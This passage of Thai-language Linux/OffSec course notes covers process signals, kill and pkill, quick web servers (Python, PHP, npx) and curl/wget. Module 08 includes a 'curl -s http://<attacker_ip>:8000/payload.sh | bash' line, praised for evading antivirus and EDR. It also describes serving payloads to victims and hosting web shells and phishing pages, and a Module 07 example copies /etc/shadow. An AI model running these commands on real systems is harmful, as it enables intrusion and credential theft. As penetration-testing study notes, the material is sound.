     3. ตรวจสอบสถานะด้วยคำสั่ง **`jobs`**: จะเห็นหมายเลข Job และสถานะแจ้งว่า `Stopped`
     4. สั่งให้ทำงานต่อหลังฉากด้วย **`bg %1`** (หรือ `bg 1`): สถานะจะเปลี่ยนเป็น `Running` ใน Background ทันทีโดยไม่ยึดหน้าจอ
     5. **การปิดหรือตัดการทำงาน (Termination Rule):**
        - **หากจะใช้คีย์ลัด `Ctrl + C`:** จะกดส่งเดชขณะที่งานกำลังรันอยู่หลังฉากไม่ได้ (เพราะ `Ctrl + C` ส่งสัญญาณขัดจังหวะเฉพาะโปรเซสที่กำลังคุมหน้าจออยู่เท่านั้น) **ต้องสั่ง `fg %1` (หรือ `fg 1`) เพื่อดึงกลับขึ้นมาหน้าจอก่อน แล้วจึงกด `Ctrl + C` เพื่อสั่งฆ่า**
        - **หรือสั่งประหารจากหลังฉากโดยตรง:** สามารถส่งสัญญาณฆ่าผ่าน Job ID ได้ทันทีโดยไม่ต้องดึงขึ้นมาหน้าจอ เช่น `kill %1` หรือ `kill -9 %1`

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ความต่อเนื่องเชิงไวยากรณ์: เมื่อไหร่ที่ต้องมีขีด `-u` (System V vs BSD):**
   - ใน Module 06 มีการเตือนว่าห้ามพิมพ์ `ps -aux` เพราะขีด `-` จะทำให้ระบบเข้าใจว่าเรากำลังใช้ System V Syntax และมองว่า `-u` กำลังรอรับชื่อ User
   - ใน Module 07 นี้ คำสั่ง `ps -u <username>` คือการใช้งานแฟล็ก `-u` ตามมาตรฐาน System V ที่ถูกต้อง 100% เพื่อกรองดูโปรเซสของ User ที่ต้องการ เช่น `ps -u kali` หรือ `ps -u root`
   - **เปรียบเทียบภาพจำ:**
     - `ps aux` (สไตล์ BSD ไม่มีขีด): ส่องทุกโปรเซสใน OS โดยอักษร `u` คือรูปแบบการแสดงผล (User-oriented display format: USER, PID, %CPU, %MEM)
     - `ps -u <name>` (สไตล์ System V มีขีด): ส่องเฉพาะโปรเซสที่ User คนนั้นเป็นเจ้าของจริง
2. **ตระกูล `pgrep` (`plain` vs `-l` vs `-a`):**
   - **`pgrep <name>`:** คืนค่าเฉพาะตัวเลข PID เพียวๆ (เช่น `2401`) ตัดข้อความอื่นทิ้งทั้งหมด ออกแบบมาเพื่อเป็นกระสุนป้อนให้คำสั่งอื่นผ่าน `$()` ได้ทันที
   - **`pgrep -l <name>`:** คืนค่า PID พร้อมชื่อ Binary สั้นๆ (`-l` = List Name) สำหรับสายตามนุษย์ตรวจสอบก่อนลงมือยิงสัญญาณฆ่าโปรเซส
   - **`pgrep -a <name>`:** คืนค่า PID พร้อม Argument และพารามิเตอร์เต็มยศ (`-a` = Full Command Line) ช่วยให้แยกแยะได้ชัดเจนว่าใครกำลังรันสคริปต์อะไรด้วยพารามิเตอร์ไหน
3. **กลไก Command Substitution `$()` (การแทนที่ผลลัพธ์คำสั่ง):**
   - **หลักการทำงาน:** คิดในวงเล็บให้เสร็จก่อนเหมือนสมการคณิตศาสตร์ เช่น `kill -9 $(pgrep sleep)` ตัว Shell จะแตก Subshell ไปรัน `pgrep sleep` ก่อน เมื่อได้เลข PID ออกมา (เช่น `2401 2402`) มันจะเอาตัวเลขนี้มาแทนที่ก้อน `$()` ทันที กลายเป็น `kill -9 2401 2402`
   - **ทำไมมาตรฐานยุคใหม่ถึงใช้ `$()` แทน Backticks (`` ` ``):**
     - **อ่านง่าย ไม่สับสน:** Backtick (`` ` ``) มักดูคล้าย Single Quote (`'`) จนพิมพ์ผิด
     - **รองรับการซ้อนคำสั่ง (Nesting):** `$()` ซ้อนวงเล็บได้ไม่จำกัดชั้นโดยไม่ต้องใส่ Backslash `\` หนีตลอดเวลา เช่น `mkdir -p "recon_$(hostname)_$(date +%F)"`
   - **ตัวอย่างยอดฮิตที่สาย OffSec / Scripting ใช้ทุกวัน:**
     - `TARGET_IP=$(cat target.txt)` : กำหนดตัวแปร IP จากไฟล์เป้าหมาย
     - `mkdir -p "recon_$(hostname)_$(date +%F)"` : สร้างโฟลเดอร์ผลสแกนพร้อมกำกับชื่อโฮสต์และวันที่
     - `cp /etc/shadow /backup/shadow_$(date +%Y%m%d).bak` : แบ็กอัปไฟล์คอนฟิกพร้อมประทับเวลา
     - `nmap -sV $(cat live_hosts.txt)` : ป้อนรายชื่อโฮสต์ที่เปิดอยู่ให้ Nmap สแกนต่อทันที
4. **พฤติกรรมคำสั่ง `ping` บน Linux vs Windows (ทำไมต้องมี `-c`):**
   - **บน Windows:** คำสั่ง `ping <target>` ตามค่าเริ่มต้นจะส่งแพ็กเก็ต ICMP เพียง 4 ครั้งแล้วสรุปผลและปิดตัวเองอัตโนมัติ
   - **บน Linux:** คำสั่ง `ping <target>` จะยิงต่อไปเรื่อยๆ อย่าง **ไม่มีที่สิ้นสุด (Infinite Loop)** จนกว่าผู้ใช้จะกดคีย์บอร์ดสั่งหยุด (`Ctrl + C`)
   - **แฟล็ก `-c <count>` (Count):** เป็นแฟล็กบังคับนับจำนวนครั้ง เพื่อป้องกันไม่ให้คำสั่งยึด Terminal ตลอดกาล เช่น `ping -c 100 8.8.8.8` (ส่งแค่ 100 แพ็กเก็ตแล้วจบการทำงาน) เหมาะอย่างยิ่งสำหรับใช้ทดสอบรันเป็น Background Process ควบคู่กับเครื่องหมาย `&`
5. **ถอดรหัสสถานะในคอลัมน์ `STAT` ของคำสั่ง `ps` (ทำไมขึ้น T และ R+):**
   - **รหัสหลัก (Main State):**
     - **`R` (Running / Runnable):** กำลังถูกประมวลผลอยู่บน CPU จริง ณ วินาทีนั้น หรือเข้าคิวพร้อมรันทันที
     - **`S` (Interruptible Sleep):** หลับรอ Event/IO (เช่น รอรับ Network Packet หรือรอผู้ใช้กดแป้นพิมพ์ สามารถปลุกด้วย Signal ได้)
     - **`D` (Uninterruptible Sleep):** หลับลึกรอฮาร์ดแวร์ดิสก์ I/O ไม่สามารถแทรกแซงหรือสั่งฆ่าด้วย `kill -9` ได้จนกว่าดิสก์จะตอบสนอง
     - **`T` (Stopped by Signal):** ถูกแช่แข็งชั่วคราวใน RAM (เกิดขึ้นเมื่อกด **`Ctrl + Z`** ส่งสัญญาณ `SIGTSTP`) ไม่กิน CPU รอนิ่งๆ จนกว่าจะมีคำสั่ง `bg` หรือ `fg` ส่งสัญญาณ `SIGCONT` มาปลุก
     - **`Z` (Zombie):** โปรเซสที่ตายไปแล้ว แต่ Parent Process ยังไม่ยอมอ่านค่า Exit Status ทำให้ซากยังค้างอยู่ใน Process Table
   - **สัญลักษณ์เสริม (Modifiers):**
     - **`+` (Foreground):** โปรเซสนั้นกำลังเป็นเจ้าของหน้าจอ Terminal (รับ Keyboard Input ได้)
     - **`s` (Session Leader):** โปรเซสที่เป็นผู้นำเซสชัน (เช่น ตัวโปรเซส `bash` ของหน้าต่างนั้น)
   - **ทำไมคำสั่ง `ps` ถึงขึ้น `R+` ให้ตัวเองเสมอ:** เพราะในเสี้ยววินาทีที่กดรัน ตัว `ps` เองกำลังถูก CPU ประมวลผล (`R`) และกำลังแสดงผลยึดหน้าจอ Terminal อยู่ (`+`)
6. **สารบบ Signals และการใช้งาน `kill -l` (Signal Architecture):**
   - **ความจริงของคำสั่ง `kill`:** คำสั่ง `kill` ไม่ได้แปลว่า "ฆ่า" เสมอไป แต่แท้จริงแล้วคือ **"เครื่องมือส่งสัญญาณ (Signal Transmitter)"** ไปหาโปรเซสตามหมายเลข PID
   - **คำสั่ง `kill -l`:** ใช้เปิดแคตตาล็อกดูรายชื่อ Signals ทั้ง 64 ตัวในระบบ Linux สามารถใช้แปลงกลับไปมาระหว่างชื่อและหมายเลขได้ เช่น `kill -l 9` (ตอบ `KILL`) หรือ `kill -l KILL` (ตอบ `9`)
   - **เจาะลึก Signals ยุทธวิธีที่สาย OffSec และ SysAdmin ต้องแม่นยำ:**
     1. **`SIGHUP` (Signal 1):** สั่งให้ Daemon อ่านไฟล์คอนฟิกใหม่โดยไม่ต้องรีสตาร์ท Process
     2. **`SIGINT` (Signal 2):** สัญญาณขัดจังหวะ — **คำสั่ง `kill -2 <PID>` คือการจำลองการกด `Ctrl + C`** ส่งตรงไปยังโปรเซสเพื่อขัดจังหวะ แม้โปรเซสนั้นจะรันอยู่หลังฉากก็ตาม
     3. **`SIGKILL` (Signal 9):** คำสั่งประหารชีวิตทันทีโดยเคอร์เนล (Uncatchable — โปรเซสไม่สามารถดักจับหรือปฏิเสธได้)
     4. **`SIGTERM` (Signal 15):** คำสั่งขอให้ปิดตัวลงอย่างสุภาพ (Default เมื่อพิมพ์ `kill <PID>` เฉยๆ)
     5. **`SIGCONT` (Signal 18):** สัญญาณปลุกโปรเซสที่หยุดอยู่ให้ทำงานต่อ (ทำงานเบื้องหลังของคำสั่ง `bg` และ `fg`)
     6. **`SIGSTOP` (Signal 19):** **คำสั่ง `kill -19 <PID>` สั่งแช่แข็งโปรเซสทันที** (ต่างจาก `Ctrl + Z` ที่เป็น `SIGTSTP 20` ตรงที่ `SIGSTOP 19` สั่งตรงจากเคอร์เนล โปรแกรมไม่สามารถดักจับหรือปฏิเสธได้ เหมือนกับ `SIGKILL` แต่เป็นการแช่แข็งแทนที่จะฆ่าทิ้ง)
7. **ยุทธวิธีการกวาดล้างโปรเซส: `kill` vs `pkill` vs `killall` และความลับของแฟล็ก `-f`:**
    - **เปรียบเทียบเชิงยุทธวิธี (Tactical Hierarchy):**
      - `[ สไนเปอร์ ] kill <PID>` — เจาะจงยิงทีละเป้าหมาย (ต้องรู้ PID ชัดเจน)
      - `[ ปืนกลกวาด ] pkill <pattern>` — กวาดล้างทุกเป้าหมายที่ตรงกับ Pattern (เช่น `pkill -9 ping`)
      - `[ ระเบิดปูพรม ] killall <binary_name>` — กวาดล้างทุกโปรเซสที่รันด้วยชื่อ Binary นั้นเป๊ะๆ (เช่น `killall -9 python3`)
      - `[ เลเซอร์ติดสโคป ] pkill -f "<script/args>"` — ส่องลึกถึงพารามิเตอร์/ชื่อไฟล์ ไม่ยิงโดนตัวอื่น (Precision Strike)
    - **ความลับของแฟล็ก `-f` ใน `pkill -f` (Full Command-line Matching):**
      - ตามปกติ `pkill` จะตรวจจับเฉพาะ **ชื่อโปรแกรมหลัก (Binary)** เช่น `python3` หรือ `bash`
      - หากในเครื่องมีสคริปต์รันอยู่ 2 ตัว: ตัวหนึ่งคือเว็บระบบ (`python3 server.py`) อีกตัวคือแบ็กดอร์แฮกเกอร์ (`python3 backdoor.py`) หากพิมพ์ `pkill python3` จะทำให้เว็บระบบตายไปด้วย!
      - **การใส่แฟล็ก `-f`:** สั่งให้ระบบส่องลึกลงไปถึง **Argument และชื่อไฟล์สคริปต์** ทำให้คำสั่ง `pkill -f "backdoor.py"` หรือ `pkill -f "malicious_script.sh"` ปลิดชีพเฉพาะสคริปต์เป้าหมายได้อย่างแม่นยำ โดยไม่กระทบกับโปรเซสอื่นในระบบ

---

## Module 08: Lightweight Web Services & HTTP Querying
- **Status:** ✅ Completed
- **Core Concept:** การเปิด Web Server ขนาดเล็กในเสี้ยววินาทีเพื่อใช้ในการส่ง Payload / ดึงข้อมูล และการยิง HTTP Request ผ่าน Terminal ด้วย `curl`

### 📝 Key Notes & Mindset
- ในงาน OffSec การเปิด Local HTTP Server บน Kali คือหัวใจของการส่ง Exploit, Reverse Shell Script หรือรับไฟล์ Exfiltrate จากเครื่องเหยื่อ

### 💻 Essential Commands
```bash
# เวิร์กโฟลว์สร้างและเปิด Web Server ขนาดเล็กเฉพาะกิจ (Instant Web Hosting)
mkdir myweb && cd myweb             # สร้างโฟลเดอร์สำหรับทำ Web Root แล้วเข้าไปทันที
echo "Hello! Hi!" > index.html       # สร้างไฟล์หน้าแรก (Web Server จะดึง index.html มาแสดงเป็นค่าเริ่มต้นอัตโนมัติ)
python3 -m http.server 7600         # รัน Web Server ด้วย Python ทันทีที่พอร์ต 7600 (พอร์ต > 1024 ไม่ต้องใช้ sudo)

# เปิด Local Web Server ด้วย PHP Built-in Server (ประมวลผลโค้ด PHP ได้ทันทีโดยไม่ต้องลง Apache)
php -S 127.0.0.1:8000               # รัน Web Server เฉพาะเครื่องตัวเองที่พอร์ต 8000 (Non-privileged port ไม่ต้อง sudo)
sudo php -S 127.0.0.1:80            # รันบนพอร์ต 80 มาตรฐาน (พอร์ต < 1024 ต้องใช้สิทธิ์ sudo)
php -S 0.0.0.0:8000                 # เปิดรับการเชื่อมต่อจากภายนอกทุก Network Interface (ให้เครื่องอื่นเข้าถึงได้)

# เปิด Local Web Server ด้วย Node.js ผ่าน npx (Zero-install รันแพ็กเกจชั่วคราวโดยไม่ต้องลงโปรแกรมถาวร)
npx http-server -p 8086             # ดึง http-server มารันชั่วคราวที่พอร์ต 8086 (-p = port ค่าเริ่มต้นคือ 8080)
npx http-server -a 127.0.0.1 -p 8086 # ล็อกพอร์ต 8086 และจำกัดให้เข้าถึงได้เฉพาะ localhost (-a = address)

# ควบคุมและคอนฟิก Production Web Server (Apache2 Daemon)
sudo nano /etc/apache2/ports.conf    # แก้ไขพอร์ตที่ Apache เปิดรับฟัง (เช่น Listen 80 หรือ Listen 8080)
sudo systemctl start apache2         # สั่งรัน Apache Daemon (ใส่ sudo เพื่อเลี่ยง Polkit Authentication Prompt)
sudo systemctl status apache2        # ตรวจสอบสถานะว่า Active (running) หรือไม่

# ทดสอบยิง Request ดึงเนื้อหาหน้าเว็บผ่าน CLI / ตรวจสอบการทำงาน
curl http://localhost:7600          # ส่ง GET Request และดึงข้อความ "Hello! Hi!" มาแสดงบน Terminal ทันที
curl http://localhost:8000          # ทดสอบพอร์ตมาตรฐาน 8000 (หากรันด้วยพอร์ต 8000)

# ตรวจสอบการสื่อสารแบบเจาะลึก (Troubleshooting & Reconnaissance)
curl -v http://localhost:8080       # โหมด Verbose ส่องทั้ง TCP Handshake (*), Request Headers (>) และ Response Headers (<)
curl -I https://example.com         # ส่งเฉพาะ HEAD Request ดึงดูเฉพาะ Response Headers แบบย่อ (ตรวจหา Server Version)

# ดาวน์โหลดและบันทึกไฟล์ผ่าน Terminal (เปรียบเทียบ curl vs wget)
curl -o <output_filename> http://localhost:8080 # บันทึกไฟล์โดยกำหนดชื่อเองตามใจชอบ (เช่น curl -o coolwebsite localhost:8080)
curl -O http://<target_ip>:8000/linpeas.sh     # บันทึกไฟล์โดยดึงชื่อเดิมจากปลายทาง URL อัตโนมัติ (Uppercase O)
curl -s -O http://<target_ip>:8000/linpeas.sh   # ดาวน์โหลดแบบเงียบ ไร้ Progress Meter กวนหน้าจอ (-s = Silent)
wget http://<target_ip>:8000/linpeas.sh         # URL มีชื่อไฟล์กำกับ -> บันทึกได้ไฟล์ linpeas.sh ตรงๆ
wget http://<target_ip>:8000                    # URL ไม่มีชื่อไฟล์ -> wget จะตั้งชื่อเซฟเป็น index.html ให้อัตโนมัติ

# สั่ง Execute Bash Script จาก Web URL โดยไม่ต้องบันทึกลงดิสก์ (Memory Execution)
curl -s http://<attacker_ip>:8000/payload.sh | bash
```

### 🧠 Feynman Takeaway & Reflection
#### 💡 แก่นความคิดและกลไกสำคัญ (Core Mental Models)
1. **สัจธรรมของ `index.html` (Default Document Rule):**
   - เมื่อ Browser หรือคำสั่ง `curl` เรียกไปยัง Root URL (เช่น `http://localhost:7600/`) เว็บเซิร์ฟเวอร์ทุกตัวจะมองหาและดึงไฟล์ชื่อ `index.html` มาแสดงผลโดยอัตโนมัติเป็นลำดับแรกเสมอ
   - **ถ้าไม่มี `index.html` จะเกิดอะไรขึ้น? (Directory Listing):** ตัว `python3 -m http.server` จะเปลี่ยนโหมดเป็นการแสดงรายการไฟล์และโฟลเดอร์ทั้งหมดในไดเรกทอรีนั้น (คล้ายการรัน `ls` บนหน้าเว็บ) ซึ่งในงาน OffSec นิยมใช้แบบไม่มี `index.html` เพื่อแจกจ่ายเครื่องมือ (เช่น ให้เครื่องเหยื่อดาวน์โหลดสคริปต์ `linpeas.sh` หรือ Exploit Payload ไปรัน)
2. **ทำไมต้องระบุพอร์ตสูง เช่น 7600 หรือ 8000 (Privileged Ports vs Non-Privileged Ports):**
   - **พอร์ตต่ำกว่า 1024 (1–1023):** เช่น พอร์ต 80 (HTTP มาตรฐาน) หรือ 443 (HTTPS) ถือเป็น **Privileged Ports** ซึ่งเคอร์เนล Linux สงวนไว้ให้เฉพาะสิทธิ์ `root` (`sudo`) เท่านั้น
   - **พอร์ต 1024–65535:** เป็น Non-privileged Ports อนุญาตให้ผู้ใช้งานทั่วไป (เช่น User `kali`) สามารถเปิดบริการ Network Service ได้ทันทีโดยไม่ต้องใช้สิทธิ์ `sudo`
3. **ความหมายของ `localhost` (Loopback Address):**
   - `localhost` แมปเข้ากับ IP `127.0.0.1` (IPv4) และ `::1` (IPv6) เสมอ ซึ่งเป็น Loopback Virtual Interface ภายในระบบ ข้อมูลจะวิ่งวนอยู่ภายในเคอร์เนลของเครื่องตัวเองโดยไม่ต้องออกสายแลนหรืออินเทอร์เน็ตภายนอก เหมาะสำหรับการทดสอบบริการในเครื่องก่อนเปิดเผยสู่ภายนอก
4. **อาวุธฝั่ง PHP: `php -S 127.0.0.1:<port>` (Dynamic PHP Server):**
   - **ความต่างจาก Python `http.server`:** Python ให้บริการเฉพาะ Static Files (HTML/JS/CSS หรือแจกไฟล์ดิบ) หากมีไฟล์ `.php` ตัว Python จะส่งโค้ด PHP ดิบๆ ออกไปโดยไม่ประมวลผล แต่คำสั่ง `php -S` จะ **Compile & Execute โค้ด PHP** บนเซิร์ฟเวอร์จริงๆ เหมาะสำหรับการทดสอบ Web Shell, หน้าเว็บฟิชชิ่ง (Credential Harvester), หรือฟอร์มล็อกอินจำลอง
   - **ไวยากรณ์:** แฟล็ก **`-S` (ตัวพิมพ์ใหญ่ย่อมาจาก Server)** ตามด้วย `IP:PORT`
   - **ความลับของการ Bind IP (`127.0.0.1` vs `0.0.0.0`):**
     - `127.0.0.1:<port>`: อนุญาตให้เข้าถึงได้เฉพาะจากเครื่องตัวเองเท่านั้น (Loopback Isolation) ปลอดภัยขณะทดสอบ
     - `0.0.0.0:<port>`: สั่งให้เซิร์ฟเวอร์เปิดรับการเชื่อมต่อจากทุก Network Interface ทำให้เครื่องเป้าหมายหรือคนในวง LAN สามารถเข้าถึงหน้าเว็บหรือยิง Request มาหาเราได้
   - **ข้อควรระวังเรื่องสิทธิ์พอร์ต 80:** หากสั่งรันบนพอร์ต 80 (`php -S 127.0.0.1:80`) เคอร์เนลจะฟ้อง Permission Denied ทันทีหากไม่ใส่ **`sudo`** นำหน้า เพราะพอร์ต 80 เป็น Privileged Port
5. **อาวุธฝั่ง Node.js: `npx http-server -p 8086` (Zero-Install On-the-Fly Server):**
   - **พลังของ `npx` (Node Package Execute):** ต่างจากการสั่ง `npm install -g http-server` ที่ต้องติดตั้งแพ็กเกจลงดิสก์อย่างถาวร คำสั่ง `npx` จะดึงแพ็กเกจมารันในหน่วยความจำ/แคชชั่วคราวทันทีโดยไม่ทิ้งร่องรอยการติดตั้งโปรแกรมลงในระบบ เหมาะกับเครื่องแล็บหรือเครื่องเป้าหมายที่มี Node.js ติดตั้งอยู่แล้ว
   - **ไวยากรณ์:** แฟล็ก **`-p <port>`** ใช้กำหนดหมายเลขพอร์ต (เช่น 8086) หากไม่ระบุค่าเริ่มต้นของ `http-server` จะเป็นพอร์ต `8080` และสามารถใช้แฟล็ก **`-a <ip>`** เพื่อระบุ Address ที่ต้องการ Bind (เช่น `-a 127.0.0.1`)
   - **จุดเด่น:** รองรับ Cross-Origin Resource Sharing (CORS), มี Directory Listing หน้าตาสวยงาม พร้อมสรุป IP ทุก Interface (ทั้ง Local IP และ Network LAN IP) ให้อัตโนมัติบนหน้าจอ
6. **สถาปัตยกรรม Apache2 และความต่างของ Web Root (Production vs Ad-hoc):**
   - **`apache2` คืออะไร:** คือ Apache HTTP Server ซอฟต์แวร์ Web Server ระดับ Enterprise ที่รันเป็น Background Daemon บริหารจัดการผ่าน Systemd (`apache2.service`) แตกต่างจากสคริปต์เปิดเว็บชั่วคราว (Python/PHP/Node) ตรงที่รองรับการเข้าชมพร้อมกันจำนวนมหาศาล (High Concurrency), มีระบบ Virtual Hosts (รันหลายเว็บไซต์แยกโดเมนในเครื่องเดียว), และรองรับโมดูลความปลอดภัย/การเข้ารหัสเต็มรูปแบบ
   - **ความต่างเชิงปรัชญาของ Web Root (Python vs Apache):**
     - **Python (`http.server`): Dynamic Working Directory** — เสิร์ฟไฟล์จากไดเรกทอรีปัจจุบันที่เรากำลังยืนอยู่ ณ วินาทีนั้น (`pwd`) สั่งรันที่ไหน โฟลเดอร์นั้นจะกลายเป็นหน้าเว็บทันที เหมาะกับการใช้งานเฉพาะกิจแล้วปิดทิ้ง
     - **Apache (`apache2`): Centralized System Root (`/var/www/html/`)** — ไม่ว่าจะสั่งสตาร์ต Service จากที่ใดในระบบ ตัว Apache จะมองหาและเสิร์ฟไฟล์จากไดเรกทอรีส่วนกลางตามมาตรฐาน FHS เสมอ นั่นคือ `/var/www/html/` (ไฟล์หน้าแรกคือ `/var/www/html/index.html`) การจะเพิ่มหรือแก้ไขไฟล์เว็บต้องทำผ่านไดเรกทอรีนี้และต้องใช้สิทธิ์ `sudo`
   - **ไฟล์คอนฟิกพอร์ต `/etc/apache2/ports.conf`:** ไฟล์กำหนดพอร์ตดักฟังส่วนกลาง เช่น `Listen 80` (HTTP) หรือ `Listen 443` (HTTPS)
   - **ถอดรหัส `AUTHENTICATING FOR org.freedesktop.systemd1.manage-units` (Polkit Framework):**
     - เกิดขึ้นเมื่อสั่ง `systemctl start apache2` โดย**ลืมใส่ `sudo`**
     - ตัวระบบไม่ได้ปฏิเสธคำสั่งทันที แต่ส่งต่อการขอสิทธิ์ไปยัง **Polkit (PolicyKit)** ซึ่งเป็น Privilege Authorization Framework ของเคอร์เนล Linux เพื่อถามหารหัสผ่านยืนยันสิทธิ์ในการควบคุม Systemd Service
     - **วิธีแก้ที่ถูกต้อง:** สั่งรันด้วย `sudo systemctl start apache2` เสมอเพื่อยืนยันสิทธิ์ผ่าน Sudoers ตั้งแต่ต้น
7. **ยุทธวิธีการดาวน์โหลดไฟล์ด้วย `curl`: ถอดรหัส `-o` vs `-O` vs `-s`:**
   - **`curl -o <custom_filename> <url>` (Lowercase `o` = Custom Output):** กำหนดชื่อไฟล์เซฟลงดิสก์เองตามต้องการ เช่น `curl -o coolwebsite localhost:8080` (ดึงหน้าแรกของเว็บมาเซฟเป็นชื่อ `coolwebsite`) เหมาะอย่างยิ่งเมื่อ URL ปลายทางไม่มีชื่อไฟล์กำกับ (เช่น หน้าเว็บ Root `/` หรือพอร์ต `:8080`)
   - **`curl -O <url>` (Uppercase `O` = Remote Name):** สั่งให้เคอร์เนลตัดชื่อไฟล์จากท้าย URL มาตั้งเป็นชื่อไฟล์ในเครื่องอัตโนมัติ เช่น `curl -O http://<ip>:8000/linpeas.sh` จะได้ไฟล์ `linpeas.sh` ทันทีโดยไม่ต้องพิมพ์ชื่อซ้ำ
   - **การพรางตัวและปิด Progress Meter ด้วยแฟล็ก `-s` (Silent):** เมื่อดาวน์โหลดไฟล์ ตัว `curl` จะพ่นตาราง Progress Meter ออกมาแสดงสปีดและเวลา ในงาน OffSec หรือ Automation Scripts จะใส่แฟล็ก `-s` เสมอ (เช่น `curl -s -o file.txt <url>`) เพื่อตัดการแสดงผลทิ้งทั้งหมดให้ทำงานเงียบสนิท
   - **พฤติกรรมของ `wget` (ระบุชื่อไฟล์ vs ไม่ระบุชื่อไฟล์):**
     - `wget http://<ip>:8000/linpeas.sh`: URL มีชื่อไฟล์กำกับชัดเจน ➔ ดึงมาบันทึกเป็นชื่อไฟล์ `linpeas.sh` ตรงๆ
     - `wget http://<ip>:8000`: URL จบที่พอร์ตหรือ Root ไม่มีชื่อไฟล์ ➔ **`wget` จะตั้งชื่อบันทึกลงดิสก์เป็น `index.html` ให้อัตโนมัติ** (หากมีไฟล์เดิมอยู่จะรันเลขเป็น `index.html.1`)
     - **จุดตัดสำคัญระหว่าง `curl` กับ `wget`:** คำสั่ง `curl` ค่าเริ่มต้นจะพ่นเนื้อหาลงหน้าจอ Terminal (ไม่เซฟไฟล์ เว้นแต่จะระบุ `-o` หรือ `-O`) ในขณะที่ `wget` ค่าเริ่มต้นจะดาวน์โหลดบันทึกลงดิสก์เป็นไฟล์เสมอ
8. **ถอดรหัสโหมด Verbose ด้วย `curl -v` (ส่องบทสนทนา HTTP เชิงลึก):**
   - **เป้าหมาย:** ปกติ `curl` จะแสดงแค่เนื้อหาหน้าเว็บ (Body) แต่แฟล็ก **`-v` (Verbose)** จะเปิดเผยการแลกเปลี่ยนข้อมูลระดับ Protocol ทั้งหมด เหมาะมากสำหรับการดีบักและการสอดแนม (Reconnaissance)
   - **ถอดรหัสสัญลักษณ์ 3 รูปแบบบนหน้าจอ:**
     - **`*` (Asterisk - System/Network):** ข้อมูลการเชื่อมต่อเครือข่าย เช่น `Trying ::1:8080...` และ `Connected to localhost` (เห็นการพยายามต่อผ่าน IPv6 `::1` ก่อน IPv4)
     - **`>` (Right Arrow - Outgoing Request):** สิ่งที่เครื่องเราส่งไปหาเซิร์ฟเวอร์ เช่น `GET / HTTP/1.1`, `Host: localhost:8080`, `User-Agent: curl/7.74.0`
     - **`<` (Left Arrow - Incoming Response):** สิ่งที่เซิร์ฟเวอร์ตอบกลับมา เช่น `HTTP/1.1 200 OK`, ขนาด `Content-Length`, และที่สำคัญที่สุดคือ **`Server: Apache/2.4.51 (Debian)`** ซึ่งเป็นข้อมูล Recon ชั้นยอดที่สาย OffSec นำไปเสิร์ชหาช่องโหว่ CVE ประจำเวอร์ชันต่อได้ทันที
9. **ยุทธการรันสคริปต์ใน Memory ด้วย `curl -s <url> | bash` (Fileless Execution):**
   - **กลไกการทำงาน:** ปกติการรันสคริปต์ต้องบันทึกไฟล์ลงดิสก์ก่อน (`wget ...` -> `chmod +x` -> `./script.sh`) แต่การใช้ท่อ Pipe (`|`) ส่ง Output จาก `curl -s` เข้าสู่ตัวแปลภาษา `bash` โดยตรง จะทำให้สคริปต์ถูกประมวลผลบน RAM ทันทีโดยไม่ต้องเขียนไฟล์ลง Storage
   - **ความได้เปรียบทางยุทธวิธี (OffSec):** ไร้ร่องรอยไฟล์ตกค้างบนฮาร์ดดิสก์ (Zero disk footprint / Fileless artifact) ลดโอกาสที่ระบบตรวจจับ (Antivirus/EDR) จะสแกนเจอไฟล์ในโฟลเดอร์ และช่วยประหยัดเวลา
   - **ความเสี่ยงด้านความปลอดภัย (Blind Trust Risk):** การสั่งรันสคริปต์ผ่าน `| bash` โดยไม่ได้เปิดดูซอร์สโค้ดข้างในก่อน ถือเป็นความเสี่ยงสูงสุด (Untrusted Script Execution) หากเครื่องเซิร์ฟเวอร์โดนดัดแปลงโค้ดหรือถูกดัก Man-in-the-Middle เครื่องเราจะประหารชีวิตตัวเองด้วยโค้ดอันตรายทันที

#### ⚠️ กับดักทางเทคนิคและข้อควรระวัง (Gotchas & Pitfalls)
1. **ตารางเปรียบเทียบ 3 ทหารเสือ Lightweight Web Server (Python vs PHP vs Node.js):**
   - **Python (`python3 -m http.server`):** มาพร้อม Linux แทบทุก Distro ไม่ต้องต่อเน็ต ไม่ต้องติดตั้งเพิ่ม เหมาะที่สุดสำหรับการแจก Payload ด่วน
   - **PHP (`php -S`):** ตัวเดียวที่ Execute โค้ด PHP แบบ Dynamic ได้ เหมาะกับงาน Web Shell และ Phishing Form
   - **Node.js (`npx http-server`):** ไม่ต้องติดตั้งถาวรด้วยพลังของ `npx` เหมาะกับสภาพแวดล้อม Dev ยุคใหม่และมีฟีเจอร์ CORS ครบครัน

---

## Module 09: Terminal Productive Workflows & Aliases
- **Status:** ✅ Completed
- **Core Concept:** คีย์ลัดเร่งความเร็วในการพิมพ์คำสั่ง (Speed & Ergonomics), การสืบค้นประวัติคำสั่ง (History Manipulation), ทางลัดนำทางไดเรกทอรี และการสร้าง Custom Aliases เพื่อเปลี่ยนคำสั่งยาวให้เหลือ 1 ตัวอักษร

### 📝 Terminal Shortcuts Cheat Sheet
| Shortcut | Action & Benefit |
| :--- | :--- |
| `↑` (Up Arrow) | เลื่อนดูประวัติคำสั่งก่อนหน้าทีละคำสั่ง (ดึงจาก History Buffer ในอดีต) |
| `↓` (Down Arrow) | เลื่อนกลับลงมาหาคำสั่งถัดไปจนถึงคำสั่งปัจจุบัน |
| `Ctrl + R` | ค้นหาประวัติคำสั่งย้อนหลังตามคำค้นหาแบบ Interactive (Reverse-i-search) |
| `Tab` | เติมคำสั่งหรือชื่อไฟล์/ไดเรกทอรีอัตโนมัติ (Auto-completion) |
| `Tab` `Tab` | กด Tab สองครั้งติดกันเพื่อแสดงรายชื่อตัวเลือกที่เป็นไปได้ทั้งหมด |
| `Ctrl + C` | ยกเลิก/ตัดการทำงานคำสั่งที่กำลังรันอยู่ทันที (ส่งสัญญาณ SIGINT ห้ามสับสนกับปุ่ม Copy) |
| `Ctrl + Shift + C` | คัดลอก (Copy) ข้อความที่ไฮไลต์ใน Terminal เข้าสู่ Clipboard ของระบบ |
| `Ctrl + Shift + V` | วาง (Paste) ข้อความจาก Clipboard ลงในหน้าต่าง Terminal |
| `Ctrl + L` | ล้างหน้าจอ Terminal ให้สะอาด (เทียบเท่าพิมพ์คำสั่ง `clear`) |
| `Ctrl + A` | เลื่อนเคอร์เซอร์กระโดดไปจุดเริ่มต้นของบรรทัดทันที |
| `Ctrl + E` | เลื่อนเคอร์เซอร์กระโดดไปจุดสิ้นสุดของบรรทัดทันที |
